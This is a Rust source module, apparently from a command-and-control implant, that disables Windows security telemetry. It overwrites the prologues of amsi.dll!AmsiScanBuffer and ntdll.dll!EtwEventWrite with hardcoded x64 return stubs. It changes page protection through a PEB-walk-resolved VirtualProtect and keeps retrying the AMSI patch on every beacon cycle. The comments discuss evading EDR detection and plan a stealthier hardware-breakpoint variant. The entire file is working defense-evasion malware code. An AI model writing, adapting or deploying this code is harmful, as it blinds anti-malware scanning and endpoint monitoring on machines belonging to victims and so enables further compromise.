//! AMSI/ETW bypass ("blind" evasion capability).
//!
//! Neutralizes the two Windows user-mode telemetry providers that catch
//! in-memory/malicious content at load or runtime:
//!
//! - **AMSI** (Anti-Malware Scan Interface): `amsi.dll!AmsiScanBuffer` —
//!   scanners (PowerShell, .NET Assembly load, VBA) funnel content here.
//!   Patching its prologue to `mov eax, E_INVALIDARG; ret` makes the scan
//!   "fail" and the in-box clients (PS/.NET/VBA) fail-OPEN → content not
//!   scanned.
//! - **ETW**: `ntdll.dll!EtwEventWrite` — the user-mode ETW logger EDRs hook
//!   into. Patching it to `xor rax,rax; ret` returns `STATUS_SUCCESS` and no
//!   event is written.
//!
//! # Calling convention note (x64)
//!
//! Both patches end in a plain `ret` (`C3`), NOT `ret 0x18`. The Microsoft x64
//! ABI makes the CALLER own stack cleanup (args in rcx/rdx/r8/r9 + shadow
//! space), so `ret imm16` would pop bytes the caller didn't push and corrupt
//! its stack. The `ret 0x18` variant is an x86/__stdcall artifact and must
//! NOT be used here (the implant is `x86_64-pc-windows-gnu`).
//!
//! # Stealth trade-off
//!
//! This is the P0 "classic byte-patch via VirtualProtect" approach. It is
//! reliable and simple, but `VirtualProtect` on a code page is itself an EDR
//! signal (code-integrity scan / ETW TI). The roadmap's preferred stealthier
//! variant is the HW-breakpoint (HWBP) patch (P1, `boku7`-style) which avoids
//! the protection change entirely. This module is the P0 baseline; HWBP is a
//! future addition.
//!
//! # amsi.dll availability
//!
//! `amsi.dll` is demand-loaded: it enters the PEB only when a scanner-bearing
//! subsystem starts (PowerShell engine init, .NET CLR Assembly.Load, VBA).
//! At implant entry it is usually absent. We therefore do NOT LoadLibraryA it
//! (that's itself an EDR signal for a non-.NET process) — `patch_amsi()`
//! returns `Err("amsi not loaded")` and the beacon loop retries via
//! `maybe_patch_amsi()` each cycle until the host loads it.

#![cfg(target_os = "windows")]

use core::ffi::c_void;
use core::ptr;

// ---- patch bytes (verified x64 sequences; see module docs) ----

/// `mov eax, 0x80070057 ; ret` — AmsiScanBuffer returns E_INVALIDARG, scan
/// fails, in-box clients fail-open. 6 bytes.
pub const AMSI_PATCH: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
/// `xor rax, rax ; ret` — EtwEventWrite returns STATUS_SUCCESS (0), no event
/// written. 4 bytes.
pub const ETW_PATCH: [u8; 4] = [0x48, 0x33, 0xC0, 0xC3];

const PAGE_EXECUTE_READWRITE: u32 = 0x40;

type VirtualProtect = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;

/// Resolve kernel32!VirtualProtect via the PEB walk.
unsafe fn vp() -> Option<VirtualProtect> {
    let a = crate::resolve::export_addr(b"kernel32.dll", b"VirtualProtect")?;
    Some(core::mem::transmute(a))
}

/// Are the first `patch.len()` bytes at `addr` already equal to `patch`?
///
/// Pure (reads memory only) so the idempotency check is cheap and safe to call
/// repeatedly. Used both by the patch routine and by the selftest byte-verify.
///
/// # Safety
/// `addr` must be readable for `patch.len()` bytes.
pub unsafe fn already_patched(addr: usize, patch: &[u8]) -> bool {
    let p = addr as *const u8;
    for (i, &b) in patch.iter().enumerate() {
        if *p.add(i) != b {
            return false;
        }
    }
    true
}

/// Overwrite the first `patch.len()` bytes at `addr` with `patch`, flipping
/// the page to RWX for the write window then restoring the original
/// protection. Idempotent: if the bytes already match, no VirtualProtect is
/// issued (avoids a redundant protection-change signal).
///
/// # Safety
/// `addr` must be the entry address of a patchable function (code page), and
/// `patch` a valid instruction sequence for the target's calling convention.
unsafe fn write_patch(addr: usize, patch: &[u8]) -> Result<(), &'static str> {
    if already_patched(addr, patch) {
        return Ok(());
    }
    let f = vp().ok_or("VirtualProtect unresolved")?;
    let mut old: u32 = 0;
    let mut dummy: u32 = 0;
    if f(
        addr as *mut c_void,
        patch.len(),
        PAGE_EXECUTE_READWRITE,
        &mut old,
    ) == 0
    {
        return Err("VirtualProtect -> RWX failed");
    }
    ptr::copy_nonoverlapping(patch.as_ptr(), addr as *mut u8, patch.len());
    // Restore the original protection (closes the write window).
    f(addr as *mut c_void, patch.len(), old, &mut dummy);
    Ok(())
}

/// Patch `ntdll.dll!EtwEventWrite` → `xor rax,rax; ret`. ntdll is always
/// loaded, so this succeeds post-bootstrap.
///
/// # Safety
/// Must run after the PEB-walk resolver is initialized (i.e. after
/// `nyx_entry`'s bootstrap). Single-threaded beacon context.
pub unsafe fn patch_etw() -> Result<(), &'static str> {
    let addr = crate::resolve::export_addr(b"ntdll.dll", b"EtwEventWrite")
        .ok_or("EtwEventWrite unresolved")?;
    write_patch(addr, &ETW_PATCH)
}

/// Patch `amsi.dll!AmsiScanBuffer` → `mov eax,E_INVALIDARG; ret`.
///
/// Returns `Err("amsi not loaded")` when `amsi.dll` is not yet in the PEB
/// loader list (the common case at cold start). The caller should retry on
/// the next beacon cycle via [`maybe_patch_amsi`].
///
/// # Safety
/// Must run after bootstrap. Single-threaded beacon context.
pub unsafe fn patch_amsi() -> Result<(), &'static str> {
    let addr = match crate::resolve::export_addr(b"amsi.dll", b"AmsiScanBuffer") {
        Some(a) => a,
        None => return Err("amsi not loaded"),
    };
    write_patch(addr, &AMSI_PATCH)
}

/// Cheap, idempotent re-arm of AMSI. Intended for a per-beacon-cycle call from
/// the task loop: on each iteration it tries to resolve amsi.dll (now possibly
/// loaded by the host's scanner); once it resolves and the patch lands, every
/// subsequent call hits the idempotency short-circuit and is a no-op.
///
/// Returns `true` if AMSI is now patched (either this call or a prior one).
///
/// # Safety
/// Must run after bootstrap. Single-threaded beacon context.
pub unsafe fn maybe_patch_amsi() -> bool {
    match patch_amsi() {
        Ok(()) => true,
        Err(_) => false,
    }
}

/// Convenience: patch ETW (always) and try AMSI once. Returns
/// `(amsi_done, etw_done)`.
///
/// # Safety
/// See [`patch_etw`] / [`patch_amsi`].
pub unsafe fn blind() -> (bool, bool) {
    let etw = patch_etw().is_ok();
    let amsi = patch_amsi().is_ok();
    (amsi, etw)
}
